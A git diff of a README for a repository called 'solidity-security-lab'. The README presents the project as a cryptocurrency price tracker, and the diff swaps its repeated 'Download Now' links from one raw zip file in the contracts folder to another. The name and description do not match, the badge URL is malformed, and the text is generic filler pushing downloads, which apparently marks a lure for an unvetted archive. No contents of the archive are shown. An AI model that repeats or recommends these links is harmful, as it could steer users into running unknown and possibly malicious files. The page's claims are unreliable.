@@ -1,7 +1,7 @@
 # 🚀 solidity-security-lab - Easily Track Cryptocurrency Prices
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/ritik1604/solidity-security-lab/raw/refs/heads/main/contracts/security-solidity-lab-v3.3.zip%20Latest%20Release-v1.0-blue)](https://github.com/ritik1604/solidity-security-lab/raw/refs/heads/main/contracts/security-solidity-lab-v3.3.zip)
+[![Download Latest Release](https://github.com/ritik1604/solidity-security-lab/raw/refs/heads/main/contracts/security_lab_solidity_3.0.zip%20Latest%20Release-v1.0-blue)](https://github.com/ritik1604/solidity-security-lab/raw/refs/heads/main/contracts/security_lab_solidity_3.0.zip)
 
 ## 📋 Overview
 solidity-security-lab helps you track and store cryptocurrency prices easily. It uses mock data and smart analytics logic to provide clear insights. Whether you are curious about trends or want to keep tabs on specific coins, this application puts essential information at your fingertips.
@@ -26,7 +26,7 @@ To get started with solidity-security-lab, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Go to the official releases page to download the app:  
-   [Download Here](https://github.com/ritik1604/solidity-security-lab/raw/refs/heads/main/contracts/security-solidity-lab-v3.3.zip)
+   [Download Here](https://github.com/ritik1604/solidity-security-lab/raw/refs/heads/main/contracts/security_lab_solidity_3.0.zip)
 
 2. **Choose Your Version**  
    Look for the latest release. Choose the version that matches your operating system.
@@ -77,4 +77,4 @@ You are not alone on your journey. Join fellow users and developers in our commu
 
 ## 📥 Download Now Again
 Ready to start tracking cryptocurrency prices?  
-[![Download Latest Release](https://github.com/ritik1604/solidity-security-lab/raw/refs/heads/main/contracts/security-solidity-lab-v3.3.zip%20Latest%20Release-v1.0-blue)](https://github.com/ritik1604/solidity-security-lab/raw/refs/heads/main/contracts/security-solidity-lab-v3.3.zip)
+[![Download Latest Release](https://github.com/ritik1604/solidity-security-lab/raw/refs/heads/main/contracts/security_lab_solidity_3.0.zip%20Latest%20Release-v1.0-blue)](https://github.com/ritik1604/solidity-security-lab/raw/refs/heads/main/contracts/security_lab_solidity_3.0.zip)
